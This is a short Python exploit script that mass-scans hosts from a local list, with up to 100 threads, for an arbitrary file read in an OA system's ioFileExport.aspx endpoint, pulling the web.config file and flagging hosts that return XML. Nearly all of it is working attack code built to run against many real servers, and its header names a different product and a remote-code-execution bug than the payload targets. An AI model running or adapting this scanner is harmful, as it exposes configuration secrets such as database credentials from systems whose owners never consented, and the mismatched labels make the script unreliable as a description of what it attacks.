# 作者:Ja0k charis
# For Weaver-Ecology-OA_RCE

import urllib3
import requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from threading import Thread, enumerate
from time import sleep

headers = {
    'Content-Type': 'text/xml; charset=utf-8',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
    'Cache-Control': 'max-age=0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Upgrade-Insecure-Requests': '1',
    'Content-Length': '578'
}

proxies = {
    "http": "http://127.0.0.1:10811",
    "https": "https://127.0.0.1:10811",
}


def postData(url, headers, proxies):
    try:
        s = ""
        payload = "/ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/web.config&filename=test.txt&ContentType=application/octet-stream"
        urldata = url.strip("\n") + payload
        # print(urldata)
        requests.packages.urllib3.disable_warnings()
        re = requests.get(urldata, headers=headers, proxies=proxies, verify=False)
        print(url, re.text)
        if re.status_code == 200:
            if re.text.find("<?xml") >= 0:
                print("[+]存在任意文件读取", url)
                s += url
        # with open("D:\\code\\python\\exp\\万户OA\\result.txt", "a", encoding="utf-8") as f:
        #     f.write(s)

    except requests.exceptions.ConnectionError:
        pass

with open(r"D:\code\python\exp\红帆OA任意文件读取\host.txt", encoding="utf-8") as f:
    for i in f.readlines():
        if len(enumerate()) < 100:
            Thread(target=postData, args=(i, headers, proxies)).start()
        else:
            sleep(1)